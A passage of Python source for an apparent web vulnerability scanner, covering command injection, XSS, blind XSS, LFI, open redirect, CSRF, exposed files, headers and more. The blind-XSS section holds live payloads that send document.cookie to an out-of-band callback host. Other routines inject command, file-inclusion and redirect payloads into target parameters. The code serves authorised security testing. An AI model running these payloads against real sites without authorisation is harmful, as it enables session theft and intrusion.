                        formatted = payload.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                        safe_post(self.session, url, formatted,
                                  self.timeout, headers=xml_headers, raise_for_status=False)
                        self.oob.register_interaction("xxe", formatted, url)
                        evidence_parts.append(f"oob:sent to {oob_host}")
                        signals["oob"] = True
                    except Exception:
                        continue

        # Poll OOB for callbacks
        confirmed_oob = self.oob.poll()
        for entry in confirmed_oob:
            f = finding(
                vuln_type="XML External Entity (XXE) Injection",
                url=entry.get("url", ""),
                severity="critical",
                details="Blind XXE confirmed via OOB callback",
                evidence=f"Callback: {entry.get('payload', '')[:200]}",
                verification_stage=VerificationStage.EXPLOITABLE.value,
                validation_steps=["OOB callback verified: DNS/HTTP interaction from XML parser"],
            )
            if f:
                self._add(f)
            log(f"  [XXE OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # Command Injection — Output + Time-Based + OOB Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_command_injection(self) -> list[dict]:
        """
        Command injection detection with multi-signal confirmation.

        Output-based: Inject OS commands and check for command output in response.
        Time-based:   Inject sleep/ping payloads and measure response delay.
        OOB:          Inject commands that trigger DNS/HTTP callbacks.
        """
        oob_host = self.config.get("oob_host")
        findings: list[dict] = []

        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    signals = self._cmd_injection_test_parameter(url, param, oob_host)
                    if signals and any(signals.values()):
                        f = self._cmd_injection_build_finding(url, param, signals)
                        if f:
                            self._add(f)
            except Exception as e:
                log(f"  [CMD] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Poll OOB for callbacks
        confirmed_oob = self.oob.poll()
        for entry in confirmed_oob:
            f = finding(
                vuln_type="Command Injection",
                url=entry.get("url", ""),
                severity="critical",
                details="Command injection confirmed via OOB callback",
                evidence=f"Callback: {entry.get('payload', '')[:200]}",
                verification_stage=VerificationStage.EXPLOITABLE.value,
                validation_steps=["OOB callback verified: DNS/HTTP interaction from injected command"],
            )
            if f:
                self._add(f)
            log(f"  [CMD OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    def _cmd_injection_test_parameter(self, url: str, param: str,
                                      oob_host: Optional[str]) -> Dict[str, bool]:
        signals: Dict[str, bool] = {"output": False, "time": False, "oob": False}
        evidence_parts = []

        # Output-based detection
        for payload, expected in CMD_INJECTION_PAYLOADS["unix"]:
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            body = resp.text
            if expected and expected in body:
                signals["output"] = True
                evidence_parts.append(f"output:{expected}")
                break
            for sig in CMD_INJECTION_OUTPUT_SIGNATURES:
                if sig in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{sig}")
                    break
            if signals["output"]:
                break

        if not signals["output"]:
            for payload, expected in CMD_INJECTION_PAYLOADS["windows"]:
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text
                if expected and expected in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{expected}")
                    break

        # Time-based detection
        for payload, min_delay in CMD_INJECTION_PAYLOADS["time_based"]:
            test_url = self._inject_param(url, param, payload)
            delays = []
            for _ in range(2):
                start = time.time()
                safe_get(self.session, test_url, timeout=15, raise_for_status=False)
                delays.append(time.time() - start)
            if all(d >= min_delay * 0.8 for d in delays):
                signals["time"] = True
                evidence_parts.append(f"time:delays={[round(d, 1) for d in delays]}")
                break

        # OOB-based detection
        if oob_host and not signals["output"]:
            for payload_template in CMD_INJECTION_PAYLOADS["oob"]:
                payload = payload_template.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                test_url = self._inject_param(url, param, payload)
                safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                self.oob.register_interaction("cmd_injection", payload, test_url)
                evidence_parts.append(f"oob:sent to {oob_host}")
                signals["oob"] = True
                break

        return signals

    def _cmd_injection_build_finding(self, url: str, param: str,
                                     signals: Dict[str, bool]) -> Optional[dict]:
        signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = [k for k, v in signals.items() if v]

        if signal_count >= 2:
            title = "Command Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential Command Injection"
            severity = "high"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        return finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            verification_stage=stage,
            validation_steps=[f"Signal: {s}" for s in evidence_parts],
        )

    # ═════════════════════════════════════════════════════════════════════
    # XSS — Context Detection + Headless Validation
    # ═════════════════════════════════════════════════════════════════════

    def scan_xss(self) -> list[dict]:
        """
        Context-aware XSS detection with headless browser validation.
        1. Detect reflection context (HTML, attribute, JS, URL)
        2. Inject context-aware payloads
        3. Verify execution with Playwright (alert/DOM mutation)
        4. Report only execution-verified XSS as Confirmed
        """
        self._prepare_scan()
        payloads = self._load_xss_payloads()

        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                for param in parse_qs(urlparse(url).query).keys():
                    self._scan_xss_param(findings := [], url, param, payloads)
                    for result in findings:
                        self._add(result)
            except Exception as e:
                log(f"  [XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        for form in self.recon.get("forms", []):
            try:
                for field in form.get("fields", []):
                    field_name = field.get("name")
                    if not field_name or field.get("type") in ("hidden", "submit", "button"):
                        continue
                    self._scan_xss_form(findings := [], form, field_name, payloads)
                    for result in findings:
                        self._add(result)
            except Exception as e:
                log(f"  [XSS Form] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    def _detect_xss_context(self, body: str, payload: str) -> Optional[str]:
        """Detect the context in which the payload is reflected."""
        if payload not in body:
            return None
        # Check script context
        for match in re.finditer(r"<script\b[^>]*>.*?</script>", body, re.IGNORECASE | re.DOTALL):
            if payload in match.group():
                return "javascript"
        # Check attribute context
        if re.search(r"<[^>]+\s[\w:-]+\s*=\s*['\"][^'\"]*" + re.escape(payload), body, re.IGNORECASE):
            return "attribute"
        # Check URL context
        if re.search(r"(href|src|action|formaction)\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "url"
        # Check event handler context
        if re.search(r"on\w+\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "html"
        # Default HTML context
        return "html"

    def _scan_xss_param(self, findings: list, url: str, param: str, payloads: dict) -> None:
        base = payloads.get("reflected", XSS_PAYLOADS)
        polyglots = payloads.get("polyglot", [])
        all_payloads = list(base) + polyglots

        for payload in all_payloads:
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue

            context = self._detect_xss_context(resp.text, payload)
            if not context:
                continue

            # Use context-aware payloads for this context
            context_payloads = CONTEXT_XSS_PAYLOADS.get(context, [payload])
            for ctx_payload in context_payloads:
                ctx_url = self._inject_param(url, param, ctx_payload)
                ctx_resp = safe_get(self.session, ctx_url, self.timeout)
                if not ctx_resp:
                    continue
                if ctx_payload not in ctx_resp.text and "49" not in ctx_resp.text:
                    continue

                # Stage 1: reflection detected
                # Stage 2: headless validation
                exec_result = self.browser.check_xss_execution(ctx_url, ctx_payload)

                if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                    f = finding(
                        vuln_type="Confirmed XSS",
                        url=ctx_url,
                        severity="critical",
                        details=f"Parameter '{param}' — XSS execution verified via Playwright ({context} context)",
                        evidence=f"Payload: {ctx_payload} | Alert: {exec_result.get('alert_fired')} | DOM: {exec_result.get('dom_mutation')}",
                        verification_stage=VerificationStage.EXPLOITABLE.value,
                        validation_steps=[
                            f"Reflection in {context} context detected",
                            "Playwright browser validation: JS executed",
                        ],
                    )
                    if f:
                        findings.append(f)
                    log(f"  [XSS Verified] {ctx_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                else:
                    f = finding(
                        vuln_type="Reflected XSS",
                        url=ctx_url,
                        severity="high",
                        details=f"Parameter '{param}' reflects payload in {context} context (unverified execution)",
                        evidence=f"Payload: {ctx_payload}",
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=[f"Reflection in {context} context detected (no headless browser available for execution verification)"],
                    )
                    if f:
                        findings.append(f)
                    log(f"  [XSS Detected] {ctx_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                break

    def _scan_xss_form(self, findings: list, form: dict, field_name: str, payloads: dict) -> None:
        action = form.get("action", "")
        method = form.get("method", "get").upper()
        base_payloads = payloads.get("reflected", XSS_PAYLOADS)
        polyglots = payloads.get("polyglot", [])
        all_payloads = list(base_payloads) + polyglots

        for payload in all_payloads:
            data = {f["name"]: f.get("value", "test") for f in form.get("fields", []) if f.get("name")}
            data[field_name] = payload

            if method == "POST":
                resp = safe_post(self.session, action, data, self.timeout)
                confirm_url = action
            else:
                confirm_url = action + "?" + urlencode(data)
                resp = safe_get(self.session, confirm_url, self.timeout)

            if not resp:
                continue

            context = self._detect_xss_context(resp.text, payload)
            if not context:
                continue

            context_payloads = CONTEXT_XSS_PAYLOADS.get(context, [payload])
            for ctx_payload in context_payloads:
                d2 = dict(data)
                d2[field_name] = ctx_payload

                if method == "POST":
                    r = safe_post(self.session, action, d2, self.timeout)
                else:
                    r = safe_get(self.session, action + "?" + urlencode(d2), self.timeout)

                if not r:
                    continue
                if ctx_payload not in r.text and "49" not in r.text:
                    continue

                exec_result = self.browser.check_xss_execution(confirm_url, ctx_payload)

                if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                    f = finding(
                        vuln_type="Confirmed XSS",
                        url=confirm_url,
                        severity="critical",
                        details=f"Form field '{field_name}' — XSS execution verified ({context} context)",
                        evidence=f"Payload: {ctx_payload}",
                        verification_stage=VerificationStage.EXPLOITABLE.value,
                        validation_steps=["Form reflection + Playwright execution verified"],
                    )
                    if f:
                        findings.append(f)
                    log(f"  [XSS Form Verified] {confirm_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                else:
                    f = finding(
                        vuln_type="Reflected XSS",
                        url=confirm_url,
                        severity="high",
                        details=f"Form field '{field_name}' reflects in {context} context",
                        evidence=f"Payload: {ctx_payload}",
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=[f"Reflection in {context} context (unverified execution)"],
                    )
                    if f:
                        findings.append(f)
                    log(f"  [XSS Form Detected] {confirm_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                break

    # ═════════════════════════════════════════════════════════════════════
    # Blind XSS — OOB-Based Stored XSS Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_blind_xss(self) -> list[dict]:
        """
        Blind / Stored XSS detection via OOB callbacks.

        Injects payloads that make outbound requests when executed by a
        victim (stored XSS) and waits for OOB callbacks to confirm execution.
        """
        oob_host = self.config.get("oob_host")
        if not oob_host:
            log("  [Blind XSS] No OOB host configured — skipping", Colors.YELLOW,
                verbose_only=True, verbose=self.verbose)
            return self._get_findings()

        blind_payloads = [
            f'<script>fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)</script>',
            f'<img src=x onerror=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
            f'<svg/onload=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
            f'<input autofocus onfocus=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
            f'<body onload=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
            f'<script>new Image().src="http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie</script>',
        ]

        for form in self.recon.get("forms", []):
            try:
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                fields = form.get("fields", [])

                text_fields = [
                    f for f in fields
                    if f.get("type") in ("text", "textarea", "email", "url", "search", None)
                    and f.get("name")
                ]

                for field in text_fields[:3]:  # Limit to first 3 text fields
                    for payload in blind_payloads:
                        data = {
                            f["name"]: f.get("value", "test")
                            for f in fields if f.get("name")
                        }
                        data[field["name"]] = payload

                        if method == "POST":
                            safe_post(self.session, action, data, self.timeout,
                                      raise_for_status=False)
                        else:
                            safe_get(self.session, action + "?" + urlencode(data),
                                     self.timeout, raise_for_status=False)

                        self.oob.register_interaction("blind_xss", payload, action)
                        log(f"  [Blind XSS] Injected in {field['name']} → {action}",
                            Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [Blind XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Also test URL parameters (for reflected that may be stored server-side)
        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            for param in parse_qs(urlparse(url).query).keys():
                for payload in blind_payloads[:2]:
                    test_url = self._inject_param(url, param, payload)
                    safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    self.oob.register_interaction("blind_xss", payload, test_url)

        # Poll OOB for callbacks
        confirmed_oob = self.oob.poll()
        for entry in confirmed_oob:
            f = finding(
                vuln_type="Blind XSS (Stored)",
                url=entry.get("url", ""),
                severity="critical",
                details="Blind XSS confirmed via OOB callback — payload executed by victim browser",
                evidence=f"Callback: {entry.get('payload', '')[:200]}",
                verification_stage=VerificationStage.EXPLOITABLE.value,
                validation_steps=[
                    "Payload injected into form field or URL parameter",
                    "OOB callback received: JavaScript executed in victim browser",
                ],
            )
            if f:
                self._add(f)
            log(f"  [Blind XSS OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # LFI
    # ═════════════════════════════════════════════════════════════════════

    def scan_lfi(self) -> list[dict]:
        findings: list[dict] = []
        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in LFI_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                body = resp.text
                                for sig in LFI_SIGNATURES:
                                    if sig in body:
                                        f = finding(
                                            vuln_type="Local File Inclusion",
                                            url=test_url,
                                            severity="critical",
                                            details=f"Parameter '{param}' includes local file (signature: {sig!r})",
                                            evidence=f"Payload: {payload}",
                                            verification_stage=VerificationStage.VALIDATED.value,
                                            validation_steps=[f"LFI signature '{sig}' found in response"],
                                        )
                                        if f:
                                            self._add(f)
                                        log(f"  [LFI] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                        break
                        except Exception:
                            continue
            except Exception:
                continue
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # Open Redirect
    # ═════════════════════════════════════════════════════════════════════

    def scan_open_redirect(self) -> list[dict]:
        findings: list[dict] = []
        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
                if not redirect_params:
                    continue
                for param in redirect_params:
                    for payload in OPEN_REDIRECT_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout, allow_redirects=False)
                            if not resp:
                                continue
                            loc = resp.headers.get("Location", "")
                            if "evil.com" in loc:
                                f = finding(
                                    vuln_type="Open Redirect",
                                    url=test_url,
                                    severity="medium",
                                    details=f"Parameter '{param}' redirects to external domain",
                                    evidence=f"Location: {loc[:100]}",
                                    verification_stage=VerificationStage.VALIDATED.value,
                                    validation_steps=[f"Redirect header contains external domain: {loc[:60]}"],
                                )
                                if f:
                                    self._add(f)
                                log(f"  [REDIRECT] {test_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                                break
                        except Exception:
                            continue
            except Exception:
                continue
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # CSRF
    # ═════════════════════════════════════════════════════════════════════

    def scan_csrf(self) -> list[dict]:
        findings: list[dict] = []
        for form in self.recon.get("forms", []):
            try:
                form_action = form.get("action", form.get("url", ""))
                if form_action and not self._in_scope(form_action):
                    continue
                if form.get("method", "GET").upper() != "POST":
                    continue
                token_found = any(
                    f.get("name", "").lower() in CSRF_TOKEN_NAMES
                    for f in form.get("fields", [])
                )
                if not token_found:
                    f = finding(
                        vuln_type="Missing CSRF Protection",
                        url=form_action,
                        severity="medium",
                        details="POST form does not contain a known anti-CSRF token field",
                        evidence=f"Form action: {form_action}",
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f:
                        self._add(f)
                    log(f"  [CSRF] {form_action}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # Directory Fuzzing
    # ═════════════════════════════════════════════════════════════════════

    def scan_directory_fuzz(self) -> list[dict]:
        findings: list[dict] = []
        urls = self.recon.get("urls", [])
        if not urls:
            return self._get_findings()

        base = urlparse(self.config.get("target", "")).netloc
        if not base:
            return self._get_findings()

        paths = COMMON_DIRFUZZ_PATHS[:]
        custom_wordlist = self.config.get("wordlist")
        if custom_wordlist:
            try:
                with open(custom_wordlist, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and line not in paths:
                            paths.append(line)
            except Exception:
                pass

        for path in paths:
            try:
                target_url = f"{self.config.get('target').rstrip('/')}/{path.lstrip('/')}"
                if not self._in_scope(target_url):
                    continue
                resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                if resp and resp.status_code == 200:
                    title = "Exposed Common Path"
                    details = f"Accessible path found: {target_url}"
                    if any(kw in resp.text.lower() for kw in ["index of /", "directory listing", "parent directory"]):
                        title = "Directory Listing Enabled"
                        details = f"Index listing detected at {target_url}"
                    f = finding(
                        vuln_type=title,
                        url=target_url,
                        severity="medium",
                        details=details,
                        evidence=f"HTTP {resp.status_code}",
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f:
                        self._add(f)
                    log(f"  [DIRB] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # Exposed Files
    # ═════════════════════════════════════════════════════════════════════

    def scan_exposed_files(self) -> list[dict]:
        findings: list[dict] = []
        target_base = self.config.get("target", "").rstrip("/")
        for exposed_file in EXPOSED_FILES:
            try:
                file_url = target_base + exposed_file
                if not self._in_scope(file_url):
                    continue
                resp = safe_get(self.session, file_url, self.timeout, raise_for_status=False)
                if not (resp and resp.status_code == 200):
                    continue
                severity, details = self._exposed_file_metadata(exposed_file)
                f = finding(
                    vuln_type="Exposed Sensitive File",
                    url=file_url,
                    severity=severity,
                    details=details,
                    evidence=f"HTTP {resp.status_code} — {len(resp.text)} bytes",
                    verification_stage=VerificationStage.VALIDATED.value,
                    validation_steps=[f"File accessible at {file_url} (HTTP 200)"],
                )
                if f:
                    self._add(f)
                log(f"  [EXPOSED] {file_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return self._get_findings()

    def _exposed_file_metadata(self, exposed_file: str) -> tuple[str, str]:
        lower_path = exposed_file.lower()
        if ".env" in exposed_file or "config" in lower_path:
            return "critical", "Configuration file containing potential secrets is accessible"
        if "backup" in lower_path:
            return "high", "Backup archive is publicly accessible"
        if ".git" in exposed_file or ".DS_Store" in exposed_file:
            return "high", "Version control metadata is exposed"
        if "phpinfo" in exposed_file:
            return "high", "PHP information disclosure via phpinfo()"
        if ".ssh" in exposed_file or ".aws" in exposed_file:
            return "critical", "Credentials file is publicly accessible"
        return "critical", "Sensitive file is publicly accessible"

    # ═════════════════════════════════════════════════════════════════════
    # Sensitive Data
    # ═════════════════════════════════════════════════════════════════════

    def scan_sensitive_data(self) -> list[dict]:
        from modules.utils import SecretValidator
        findings: list[dict] = []
        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                resp = safe_get(self.session, url, self.timeout, raise_for_status=False)
                if not resp or not resp.text:
                    continue
                body = resp.text
                for label, pattern in SENSITIVE_PATTERNS:
                    match = pattern.search(body)
                    if match:
                        value = match.group(0)[:120]
                        validation_steps = ["Secret pattern matched in page content"]

                        # Validate if the secret type supports it
                        secret_type_map = {
                            "AWS Access Key": "aws_access_key",
                            "AWS Secret Key": "aws_secret_key",
                            "GitHub Token": "github_token",
                            "Slack Token": "slack_token",
                        }
                        secret_type = secret_type_map.get(label)
                        validation_result = None
                        if secret_type:
                            validation_result = SecretValidator.validate(secret_type, value)
                            result_label = {
                                True: "Valid",
                                False: "Invalid",
                                None: "Unknown",
                            }.get(validation_result.get("valid"))
                            validation_steps.append(
                                f"Secret validation: {result_label} — {validation_result.get('details', '')}"
                            )

                        evidence_parts = [f"Matched: {value}"]
                        if validation_result and validation_result.get("valid") is True:
                            severity = "critical"
                            evidence_parts.append(f"Validated: {validation_result.get('details', '')}")
                        elif validation_result and validation_result.get("valid") is False:
                            severity = "info"
                            evidence_parts.append("Token invalid/revoked — no risk")
                        else:
                            severity = "high" if "key" in label.lower() else "medium"

                        f = finding(
                            vuln_type=f"Sensitive Data Exposure ({label})",
                            url=url,
                            severity=severity,
                            details=f"Potential sensitive value detected in page content: {label}",
                            evidence=" | ".join(evidence_parts),
                            verification_stage=VerificationStage.VALIDATED.value if (validation_result and validation_result.get("valid") is True) else VerificationStage.DETECTED.value,
                            validation_steps=validation_steps,
                        )
                        if f:
                            self._add(f)
                        log(f"  [SENSITIVE] {url} - {label}", Colors.RED, verbose_only=True, verbose=self.verbose)
                        break
            except Exception:
                continue
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # Headers
    # ═════════════════════════════════════════════════════════════════════

    def scan_headers(self) -> list[dict]:
        findings: list[dict] = []
        try:
            target = self.config.get("target", "")
            if not target:
                return self._get_findings()
            resp = safe_get(self.session, target, self.timeout)
            if not resp:
                return self._get_findings()
            self._scan_missing_headers(findings, target, resp)
            self._scan_disclosure_headers(findings, target, resp)
            self._scan_policy_headers(findings, target, resp)
            self._scan_cookie_headers(findings, target, resp)
        except Exception:
            pass
        for f in findings:
            self._add(f)
        return self._get_findings()

    def _scan_missing_headers(self, findings: list[dict], target: str, resp) -> None:
        for header, severity in SECURITY_HEADERS.items():
            if header in resp.headers:
                continue
            f = finding(
                vuln_type="Missing Security Header",
                url=target,
                severity=severity,
                details=f"Response is missing the '{header}' header",
                evidence=f"Headers present: {', '.join(list(resp.headers.keys())[:5])}",
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)

    def _scan_disclosure_headers(self, findings: list[dict], target: str, resp) -> None:
        server = resp.headers.get("Server", "")
        if server and any(c.isdigit() for c in server):
            f = finding(
                vuln_type="Information Disclosure (Server)",
                url=target,
                severity="low",
                details=f"Server header reveals version: {server!r}",
                evidence="",
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        for header, title in (
            ("X-Powered-By", "Information Disclosure (X-Powered-By)"),
            ("X-AspNet-Version", "Information Disclosure (X-AspNet-Version)"),
        ):
            value = resp.headers.get(header, "")
            if value:
                f = finding(
                    vuln_type=title,
                    url=target,
                    severity="low",
                    details=f"{header} reveals tech stack: {value!r}",
                    evidence="",
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f:
                    findings.append(f)

    def _scan_policy_headers(self, findings: list[dict], target: str, resp) -> None:
        csp = resp.headers.get("Content-Security-Policy", "")
        if csp and any(token in csp.lower() for token in ["unsafe-inline", "unsafe-eval", "data:"]):
            f = finding(
                vuln_type="Weak Content Security Policy",
                url=target,
                severity="medium",
                details="CSP contains potentially unsafe directives (unsafe-inline, unsafe-eval, or data:).",
                evidence=f"CSP: {csp[:200]}",
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acc = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        if acao == "*" and acc == "true":
            f = finding(
                vuln_type="Insecure CORS Configuration",
                url=target,
                severity="high",
                details="Access-Control-Allow-Origin is '*' while credentials are allowed.",
                evidence=f"Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acc}",
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        elif acao == "*":
            f = finding(
                vuln_type="Overly Permissive CORS",
                url=target,
                severity="low",
                details="Access-Control-Allow-Origin is set to '*'.",
                evidence=f"Access-Control-Allow-Origin: {acao}",
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)

    def _scan_cookie_headers(self, findings: list[dict], target: str, resp) -> None:
        cookie_headers = resp.headers.get("Set-Cookie", "")
        if cookie_headers and ("secure" not in cookie_headers.lower() or "httponly" not in cookie_headers.lower()):
            f = finding(
                vuln_type="Insecure Session Cookie",
                url=target,
                severity="medium",
                details="Set-Cookie header may be missing Secure and/or HttpOnly flags.",
                evidence=f"Set-Cookie: {cookie_headers}",
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)

    # ═════════════════════════════════════════════════════════════════════
    # Clickjacking
    # ═════════════════════════════════════════════════════════════════════

    def scan_clickjacking(self) -> list[dict]:
        findings: list[dict] = []
        target = self.config.get("target", "")
        try:
            resp = safe_get(self.session, target, self.timeout, raise_for_status=False)
            if not resp:
                return self._get_findings()
            x_frame = resp.headers.get("X-Frame-Options", "").lower()
            csp = resp.headers.get("Content-Security-Policy", "").lower()
            allows_frame = not any(directive in csp for directive in CLICKJACKING_SAFE_DIRECTIVES)
            missing_protection = not x_frame and allows_frame
            if missing_protection:
                f = finding(
                    vuln_type="Clickjacking Exposure",
                    url=target,
                    severity="medium",
                    details="The application does not enforce frame protection headers.",
                    evidence=f"X-Frame-Options: {x_frame or 'missing'}, CSP: {csp or 'missing'}",
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f:
                    self._add(f)
                log(f"  [CLICKJACKING] {target}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        except Exception:
            pass
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # HTTP Methods
    # ═════════════════════════════════════════════════════════════════════

    def scan_http_methods(self) -> list[dict]:
        findings: list[dict] = []
        target = self.config.get("target", "")
        try:
            resp = self.session.options(target, timeout=self.timeout)
            if not resp:
                return self._get_findings()
            allow_header = resp.headers.get("Allow", "")
            cors_methods = resp.headers.get("Access-Control-Allow-Methods", "")
            methods = set(self._normalize_list(allow_header) + self._normalize_list(cors_methods))
            dangerous = {"TRACE", "PUT", "DELETE", "PATCH", "PROPFIND"}
            exposed = [m for m in methods if m.upper() in dangerous]
            if exposed:
                f = finding(
                    vuln_type="Dangerous HTTP Methods Enabled",
                    url=target,
                    severity="medium",
                    details="The server supports non-safe HTTP methods.",
                    evidence=f"Allowed methods: {', '.join(sorted(methods))}",
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f:
                    self._add(f)
                log(f"  [HTTP METHODS] {target} -> {', '.join(exposed)}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        except Exception:
            pass
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # Insecure Forms
    # ═════════════════════════════════════════════════════════════════════

    def scan_insecure_forms(self) -> list[dict]:
        findings: list[dict] = []
        for form in self.recon.get("forms", []):
            try:
                method = form.get("method", "get").lower()
                action = form.get("action", "")
                if not action or method != "post":
                    continue
                parsed = urlparse(action)
                if parsed.scheme == "http":
                    f = finding(
                        vuln_type="Insecure Form Action",
                        url=action,
                        severity="high",
                        details="A POST form submits data over an insecure HTTP connection.",
                        evidence="Form action uses http:// scheme",
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f:
                        self._add(f)
                    log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
                    continue
                if any(field.get("type") == "password" for field in form.get("fields", [])):
                    if parsed.netloc and not self._same_origin(action):
                        f = finding(
                            vuln_type="Password Form Cross-Origin Submission",
                            url=action,
                            severity="high",
                            details="A password field submits to a different origin.",
                            evidence=f"Action host: {parsed.netloc}",
                            verification_stage=VerificationStage.DETECTED.value,
                        )
                        if f:
                            self._add(f)
                        log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # Subdomain Takeover
    # ═════════════════════════════════════════════════════════════════════

    def scan_subdomain_takeover(self) -> list[dict]:
        findings: list[dict] = []
        for subdomain in self.recon.get("subdomains", []):
            try:
                for scheme in ("http://", "https://"):
                    target_url = f"{scheme}{subdomain}"
                    resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                    if not resp or not resp.text:
                        continue
                    body = resp.text
                    for signature in TAKEOVER_SIGNATURES:
                        if signature.lower() in body.lower():
                            f = finding(
                                vuln_type="Subdomain Takeover",
                                url=target_url,
                                severity="high",
                                details="A known takeover fingerprint was detected on the subdomain.",
                                evidence=f"Signature: {signature}",
                                verification_stage=VerificationStage.DETECTED.value,
                            )
                            if f:
                                self._add(f)
                            log(f"  [TAKEOVER] {target_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            raise StopIteration
            except StopIteration:
                continue
            except Exception:
                continue
        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # GraphQL
    # ═════════════════════════════════════════════════════════════════════

    def scan_graphql(self) -> list[dict]:
        findings: list[dict] = []
